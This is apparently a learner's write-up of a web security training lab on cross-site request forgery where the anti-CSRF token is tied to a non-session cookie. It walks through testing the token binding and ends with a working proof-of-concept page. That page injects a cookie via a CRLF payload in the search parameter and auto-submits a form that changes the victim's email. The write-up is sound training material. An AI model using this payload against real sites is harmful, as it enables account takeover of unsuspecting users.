# Practitioner Lab 81 : CSRF where token is tied to non-session cookie

---

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

- `wiener:peter`
- `carlos:montoya`

![Untitled](Practitioner%20Lab%2081%20CSRF%20where%20token%20is%20tied%20to%20no%20dc4586f41ceb447eb0e7b267ae538e5f/Untitled.png)

Here I can see the email which is something I can change with CSRF, I can also see the CSRF token which I will have to test soon. 

I can also see a new csrfkey as well as the LastSearchTerm. 

Testing with an invalid CSRF token to see if it passes it didnt work.

![Untitled](Practitioner%20Lab%2081%20CSRF%20where%20token%20is%20tied%20to%20no%20dc4586f41ceb447eb0e7b267ae538e5f/Untitled%201.png)

I will now test it with a valid csrf token but from another user to see if it is tied to the cookie.

![Untitled](Practitioner%20Lab%2081%20CSRF%20where%20token%20is%20tied%20to%20no%20dc4586f41ceb447eb0e7b267ae538e5f/Untitled%202.png)

This is the csrf token from the other user. 

Other user CSRF token: CwJh4Rp32dV0XcWf0DtI4l6zXylzTa0W

csrfKey: PVvb4R5V6DbAzsvYsvy5gWECdYrJyJxh

Testing a valid token from another user doesnâ€™t work which shows me that the token is tied to the cookie.

Now I have to test if the token and the cookie from another user works this will tell me if it is tied to the session.

The cookie and the token from another user did work meaning that it is not tied to the session now I need to find a way to send this cookie to another user probably through the search parameter which is not tied to any cookie.

I went to intercept, made a request, used that csrf and the cookie to put into the payload

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a2900bc035679bc81e870e1006b008e.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="newchangew&#64;changed" />
      <input type="hidden" name="csrf" value="MJ57Nkhvc3T3Zqcp76A0eqZs7ZtJ8F9Q" />
      <input type="submit" value="Submit request" />
    </form>
   
     <img src="https://0a2900bc035679bc81e870e1006b008e.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=Y62H1wm5YafAm8t6wY2Jjhhg07Q2AERV%3b%20SameSite=None" onerror="document.forms[0].submit()">
   
  </body>
</html>
```

This solved the lab.